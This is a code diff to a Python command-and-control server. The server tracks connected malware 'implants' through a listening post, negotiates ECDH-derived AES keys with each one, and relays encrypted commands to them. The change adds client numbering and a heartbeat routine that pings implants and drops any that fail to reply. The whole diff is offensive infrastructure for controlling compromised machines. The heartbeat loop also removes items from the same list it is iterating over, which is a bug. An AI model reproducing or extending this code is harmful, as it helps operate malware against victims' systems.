@@ -28,7 +28,7 @@ class MyServer():
         self.lp_connections = {}
         self.client_sockets = []
         self.cmd_connections = []
-
+        self.client_count = 0
     def negotiate_secret(self, conn):
         key_gen = ecdh.key()
         client_half = conn.recv(1024)
@@ -48,14 +48,15 @@ class MyServer():
     def lp_handle_connection(self, connection):
         implant_info = connection[0].recv(1024)
         implant_info = json.loads(implant_info.decode())
-        self.lp_connections[f"{len(self.lp_connections)}"] = {
+        self.lp_connections[str(self.client_count + 1)] = {
         "connection" : connection[1],
         "info" : implant_info
         }
         key_gen = ecdh.key()
         connection[0].send(str(key_gen.half_key).encode())
         aes_secret = key_gen.gen_full(int(implant_info['number']))
-        self.client_sockets.append((connection[0], aes_secret))
+        self.client_count += 1
+        self.client_sockets.append((connection[0], aes_secret,str(self.client_count)))
 
     def command_handle_connection(self, connection):
         self.cmd_connections.append(connection)
@@ -65,6 +66,26 @@ class MyServer():
             data = connection[0].recv(int(data_len))
             data = self.decrypt_msg(data, aes_key)
             if data.decode() == "get_clients":
+                msg = self.encrypt_msg(json.dumps(self.lp_connections), aes_key)
+                connection[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+            elif data.decode() == "heartbeat":
+                temp_clients = self.client_sockets
+                for client in self.client_sockets:
+                    try:
+                        msg = self.encrypt_msg("heartbeat", client[1])
+                        client[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+                        response_len = client[0].recv(8)
+                        response = client[0].recv(int(response_len.decode()))
+                        response = self.decrypt_msg(response, client[1])
+                        if response.decode() != "im alive":
+                            temp_clients.remove(client)
+                            del self.lp_connections[client[2]]
+                            print("removing client")
+                    except:
+                        temp_clients.remove(client)
+                        del self.lp_connections[client[2]]
+                        print("removing client")
+                self.client_sockets = temp_clients
                 msg = self.encrypt_msg(json.dumps(self.lp_connections), aes_key)
                 connection[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
             else:
